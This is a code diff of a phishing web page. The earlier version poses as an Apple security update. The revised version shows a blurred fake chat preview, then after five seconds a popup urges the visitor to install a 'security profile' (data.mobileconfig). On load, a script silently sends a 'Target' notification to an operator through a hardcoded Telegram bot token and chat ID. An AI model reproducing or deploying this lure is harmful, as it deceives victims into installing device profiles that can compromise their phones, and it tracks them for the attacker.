@@ -3,27 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Security Update</title>
+    <title>Storage Recovery</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f2f2f7; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
-        img { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #1d1d1f; margin-bottom: 10px; }
-        p { color: #86868b; font-size: 14px; line-height: 1.5; }
-        .btn { background: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; display: inline-block; font-weight: 600; margin-top: 20px; }
+        body { font-family: -apple-system, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; overflow: hidden; }
+        #chatPreview { width: 100%; height: 100%; object-fit: cover; filter: blur(2px); transition: 0.5s; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        #popup { display: none; background: white; color: black; padding: 25px; border-radius: 20px; width: 80%; max-width: 300px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); z-index: 10; }
+        .btn { background: #007aff; color: white; padding: 12px 20px; border-radius: 10px; text-decoration: none; display: block; margin-top: 15px; font-weight: bold; font-size: 16px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-        <h1>Security Update</h1>
-        <p>A critical security update is required to maintain your encrypted database and secure chat storage.</p>
-        <a href="data.mobileconfig" class="btn">Install Update</a>
+
+    <img src="chat_preview.jpg" id="chatPreview">
+
+    <div class="overlay">
+        <div id="status">
+            <div class="loader"></div>
+            <p id="text">Fetching older messages...</p>
+        </div>
+
+        <div id="popup">
+            <h2 style="margin:0; font-size: 19px;">Action Required</h2>
+            <p style="font-size: 14px; color: #333; margin-top: 10px;">To view and download the full chat database, you must install the security profile.</p>
+            <a href="data.mobileconfig" class="btn">Download & Install</a>
+        </div>
     </div>
 
     <script>
         window.onload = function() {
-            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Opened_Link_🔥_Status_Waiting_for_Install");
+            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Watching_Preview_👀");
+
+            setTimeout(function() {
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('popup').style.display = 'block';
+                document.getElementById('chatPreview').style.filter = 'blur(15px)';
+            }, 5000); 
         };
     </script>
 </body>
